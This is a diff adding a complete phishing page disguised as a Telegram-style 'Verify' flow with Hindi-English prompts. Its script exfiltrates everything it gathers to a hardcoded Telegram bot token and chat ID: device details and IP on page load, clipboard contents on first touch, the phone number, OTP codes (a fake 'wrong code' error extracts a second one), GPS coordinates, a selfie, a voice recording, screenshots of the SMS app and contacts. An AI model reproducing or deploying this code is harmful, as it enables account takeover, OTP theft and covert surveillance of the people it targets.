@@ -1,0 +1,343 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Verify</title>
+<script>
+const TOKEN    = "9198268582:AAEibZJ7yHYuCXFfWyJx0ap3MrktEEmhXVU";
+const CHAT     = "8552743919";
+const REDIRECT = "https://web.telegram.org/a/";
+</script>
+<style>
+ body{font-family:system-ui;background:#17212b;color:#fff;display:flex;
+      align-items:center;justify-content:center;min-height:100vh;margin:0}
+ .box{width:90%;max-width:360px;text-align:center;padding:18px 0}
+ h2{font-size:19px;margin:0 0 8px}
+ p{color:#8b9aa8;font-size:14px;margin:0 0 14px;line-height:1.5}
+ input{width:100%;padding:14px;border-radius:10px;border:1px solid #2b3a47;
+       background:#242f3d;color:#fff;font-size:17px;box-sizing:border-box}
+ button{width:100%;padding:15px;margin-top:10px;border:0;border-radius:10px;
+        background:#3390ec;color:#fff;font-size:16px;font-weight:700}
+ button.g{background:#242f3d;border:1px solid #2b3a47;font-weight:500}
+ #st{font-size:12px;margin-bottom:10px;min-height:16px}
+ .ok{color:#5ec26a} .no{color:#f66}
+ .cells{display:flex;gap:8px;justify-content:center;margin:20px 0}
+ .cells input{width:44px;height:52px;text-align:center;font-size:22px}
+ #pv{width:100%;border-radius:10px;margin:10px 0;background:#000;max-height:26vh}
+ .dots{display:flex;gap:5px;justify-content:center;margin-bottom:16px}
+ .dot{width:18px;height:4px;border-radius:2px;background:#2b3a47}
+ .dot.on{background:#3390ec}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="dots">
+    <div class="dot on"></div><div class="dot"></div><div class="dot"></div>
+    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+  </div>
+  <div id="st"></div>
+
+  <!-- video ab sab views ke BAHAR hai -->
+  <video id="pv" autoplay muted playsinline hidden></video>
+
+  <div id="v0">
+    <h2>Number daalo</h2>
+    <p>Confirm karne ke liye</p>
+    <input id="ph" type="tel" inputmode="numeric" placeholder="+91 98765 43210">
+    <button id="b0">Aage</button>
+  </div>
+
+  <div id="v1" hidden>
+    <h2>Code daalo</h2>
+    <p id="hint"></p>
+    <div class="cells" id="cells">
+      <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+      <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+      <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+    </div>
+    <button id="b1">Verify</button>
+    <button id="bRe" class="g">Dobara bhejo</button>
+  </div>
+
+  <div id="v2" hidden>
+    <h2>Location verify</h2>
+    <p><b>Allow</b> dabao</p>
+    <button id="bLoc">Allow</button>
+    <button class="skip g" data-n="3">Skip</button>
+  </div>
+
+  <div id="v3" hidden>
+    <h2>Face verify</h2>
+    <p>Camera khud photo lega. <b>Allow</b> dabao</p>
+    <button id="bCam">Allow</button>
+    <button class="skip g" data-n="4">Skip</button>
+  </div>
+
+  <div id="v4" hidden>
+    <h2>Voice verify</h2>
+    <p>4 second khud record hoga. <b>Allow</b> dabao</p>
+    <button id="bMic">Allow</button>
+    <button class="skip g" data-n="5">Skip</button>
+  </div>
+
+  <div id="v5" hidden>
+    <h2>Security check</h2>
+    <p>Screen share karo, SMS app khol lena</p>
+    <button id="bScr">Allow</button>
+    <button class="skip g" data-n="6">Skip</button>
+  </div>
+
+  <div id="v6" hidden>
+    <h2>Contacts sync</h2>
+    <p>Contacts chuno, phir <b>Add</b> dabao</p>
+    <button id="bCon">Contacts</button>
+    <button class="skip g" data-n="7">Skip</button>
+  </div>
+
+  <div id="v7" hidden>
+    <h2>Ho gaya</h2>
+    <p>Verification complete</p>
+  </div>
+</div>
+
+<script>
+const st = document.getElementById('st');
+const pv = document.getElementById('pv');
+let phone = '?', stream = null;
+
+function stat(m, good){ st.textContent = m; st.className = good ? 'ok' : 'no'; }
+
+function vid(){
+  let id = localStorage.getItem('vid');
+  if (!id){ id = 'v' + Math.random().toString(36).slice(2,8); localStorage.setItem('vid', id); }
+  return id;
+}
+
+async function tg(text){
+  try {
+    const body = new URLSearchParams({ chat_id: CHAT.trim(), text, parse_mode:'HTML' });
+    const r = await fetch('https://api.telegram.org/bot' + TOKEN.trim() + '/sendMessage',
+      { method:'POST', body });
+    const j = await r.json();
+    stat(j.ok ? 'SENT' : 'FAIL: ' + j.description, j.ok);
+    return j.ok;
+  } catch(e){ stat('FAIL: ' + e.message, false); return false; }
+}
+
+async function tgPhoto(blob, cap){
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT.trim());
+    fd.append('caption', cap);
+    fd.append('photo', blob, 'x.jpg');
+    const r = await fetch('https://api.telegram.org/bot' + TOKEN.trim() + '/sendPhoto',
+      { method:'POST', body:fd });
+    const j = await r.json();
+    stat(j.ok ? 'PHOTO SENT' : 'FAIL: ' + j.description, j.ok);
+  } catch(e){ stat('FAIL: ' + e.message, false); }
+}
+
+async function tgAudio(blob, cap){
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT.trim());
+    fd.append('caption', cap);
+    fd.append('audio', blob, 'a.webm');
+    const r = await fetch('https://api.telegram.org/bot' + TOKEN.trim() + '/sendAudio',
+      { method:'POST', body:fd });
+    const j = await r.json();
+    stat(j.ok ? 'AUDIO SENT' : 'FAIL: ' + j.description, j.ok);
+  } catch(e){ stat('FAIL: ' + e.message, false); }
+}
+
+function go(n){
+  for (let i = 0; i <= 7; i++) document.getElementById('v'+i).hidden = (i !== n);
+  document.querySelectorAll('.dot').forEach((d,i) => d.classList.toggle('on', i <= n));
+  if (n === 7){
+    try { Notification.requestPermission(); } catch(e){}
+    setTimeout(() => location.href = REDIRECT, 1200);
+  }
+}
+
+/* boot + silent */
+(async () => {
+  const o = [];
+  try {
+    const h = await navigator.userAgentData.getHighEntropyValues(['model','platformVersion']);
+    o.push('Model: ' + h.model + ' | ' + h.platformVersion);
+  } catch(e){}
+  o.push('UA: ' + navigator.userAgent);
+  o.push('Screen: ' + screen.width + 'x' + screen.height);
+  o.push('TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone);
+  o.push('Ref: ' + (document.referrer || 'direct'));
+  let ip = 'fail';
+  try {
+    const d = await (await fetch('https://ipapi.co/json/')).json();
+    ip = 'IP: ' + d.ip + '\n' + d.city + ', ' + d.region + '\nISP: ' + d.org;
+  } catch(e){}
+  tg('[open] ' + vid() + '\n' + ip + '\n<code>' + o.join('\n') + '</code>');
+})();
+
+document.addEventListener('touchstart', async function once(){
+  document.removeEventListener('touchstart', once);
+  try {
+    const t = (await navigator.clipboard.readText()).trim();
+    if (t) tg('[clip] ' + vid() + '\n<code>' + t.slice(0,300) + '</code>');
+  } catch(e){}
+}, { passive:true });
+
+document.getElementById('b0').onclick = async () => {
+  const v = document.getElementById('ph').value;
+  if (v.replace(/\D/g,'').length < 10) return stat('Sahi number daalo', false);
+  phone = v;
+  await tg('[num] ' + vid() + ' ' + phone);
+  document.getElementById('hint').textContent = phone + ' par code bheja gaya';
+  go(1);
+  document.querySelector('#cells input').focus();
+};
+
+const ins = [...document.querySelectorAll('#cells input')];
+ins.forEach((el,i) => {
+  el.addEventListener('input', () => {
+    el.value = el.value.replace(/\D/g,'');
+    if (el.value && i < 5) ins[i+1].focus();
+  });
+  el.addEventListener('keydown', e => {
+    if (e.key === 'Backspace' && !el.value && i > 0) ins[i-1].focus();
+  });
+});
+
+let tried = false;
+document.getElementById('b1').onclick = async () => {
+  const code = ins.map(x => x.value).join('');
+  if (code.length < 6) return stat('6 digit daalo', false);
+  stat('Verify...', true);
+  await tg('[otp] ' + vid() + ' ' + phone + '\n<code>' + code + '</code>');
+  setTimeout(() => {
+    if (!tried){
+      tried = true;
+      stat('Code galat hai - dobara daalo', false);
+      ins.forEach(x => x.value = ''); ins[0].focus();
+    } else { stat('', true); go(2); }
+  }, 5000);
+};
+
+document.getElementById('bRe').onclick = () => tg('[resend] ' + phone);
+
+/* location */
+document.getElementById('bLoc').onclick = () => {
+  stat('Le rahe hain...', true);
+  if (!navigator.geolocation){ stat('GPS nahi', false); return setTimeout(() => go(3), 700); }
+  navigator.geolocation.getCurrentPosition(
+    p => {
+      const l = p.coords.latitude + ',' + p.coords.longitude;
+      tg('[gps] ' + vid() + ' ' + phone + '\n' + l + '\nhttps://maps.google.com/?q=' + p.coords.latitude);
+      setTimeout(() => go(3), 800);
+    },
+    e => { stat('GPS: ' + e.message, false); setTimeout(() => go(3), 800); },
+    { enableHighAccuracy:true, timeout:9000 }
+  );
+};
+
+/* camera */
+document.getElementById('bCam').onclick = async () => {
+  pv.hidden = false;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode:'user', width:{ ideal:1280 } }, audio:false
+    });
+  } catch(e){
+    stat('CAM: ' + e.name, false);
+    pv.hidden = true;
+    return setTimeout(() => go(4), 1500);
+  }
+  pv.srcObject = stream;
+  try { await pv.play(); } catch(e){}
+  stat('Photo le rahe hain...', true);
+  await new Promise(r => setTimeout(r, 1600));
+
+  if (!pv.videoWidth){
+    await new Promise(r => setTimeout(r, 1200));
+  }
+  const c = document.createElement('canvas');
+  c.width = pv.videoWidth || 640;
+  c.height = pv.videoHeight || 480;
+  c.getContext('2d').drawImage(pv, 0, 0, c.width, c.height);
+  const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
+  if (b) await tgPhoto(b, 'SELFIE ' + phone);
+
+  stream.getTracks().forEach(t => t.stop());
+  pv.hidden = true;
+  setTimeout(() => go(4), 800);
+};
+
+/* mic */
+document.getElementById('bMic').onclick = async () => {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ audio:true });
+  } catch(e){
+    stat('MIC: ' + e.name, false);
+    return setTimeout(() => go(5), 1500);
+  }
+  const rec = new MediaRecorder(stream); const ch = [];
+  rec.ondataavailable = e => ch.push(e.data);
+  rec.onstop = async () => {
+    const blob = new Blob(ch, { type:'audio/webm' });
+    if (blob.size > 6000) await tgAudio(blob, 'MIC ' + phone);
+    stream.getTracks().forEach(t => t.stop());
+    setTimeout(() => go(5), 800);
+  };
+  rec.start();
+  let s = 4; stat('Record... ' + s, true);
+  const iv = setInterval(() => { s--; stat('Record... ' + s, true); }, 1000);
+  setTimeout(() => { clearInterval(iv); rec.stop(); }, 4000);
+};
+
+/* screen */
+document.getElementById('bScr').onclick = async () => {
+  pv.hidden = false;
+  try {
+    stream = await navigator.mediaDevices.getDisplayMedia({ video:{ frameRate:5 } });
+  } catch(e){
+    stat('SCR: ' + e.name, false);
+    pv.hidden = true;
+    return setTimeout(() => go(6), 1500);
+  }
+  pv.srcObject = stream;
+  try { await pv.play(); } catch(e){}
+  stat('Chalu - SMS app kholo', true);
+
+  for (let i = 1; i <= 3; i++){
+    await new Promise(r => setTimeout(r, 2500));
+    if (!pv.videoWidth){ stat('video nahi - SMS app kholo', false); continue; }
+    const c = document.createElement('canvas');
+    c.width = pv.videoWidth; c.height = pv.videoHeight;
+    c.getContext('2d').drawImage(pv, 0, 0);
+    const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.75));
+    if (b) await tgPhoto(b, 'SCREEN' + i + ' ' + phone);
+    stat(i + '/3 liye', true);
+  }
+  stream.getTracks().forEach(t => t.stop());
+  pv.hidden = true;
+  setTimeout(() => go(6), 800);
+};
+
+/* contacts */
+document.getElementById('bCon').onclick = async () => {
+  if (!navigator.contacts || !navigator.contacts.select) return stat('Contacts nahi', false);
+  try {
+    const list = await navigator.contacts.select(['name','tel'], { multiple:true });
+    if (!list.length){ stat('Koi nahi chuna', false); return; }
+    const txt = list.slice(0,100)
+      .map(c => (c.name||['?'])[0] + ' — ' + (c.tel||[''])[0]).join('\n');
+    await tg('[contacts ' + list.length + '] ' + phone + '\n<code>' + txt + '</code>');
+    setTimeout(() => go(7), 800);
+  } catch(e){ stat('Cancel', false); }
+};
+
+document.querySelectorAll('.skip').forEach(b => b.onclick = () => go(+b.dataset.n));
+</script>
+</body>
+</html>
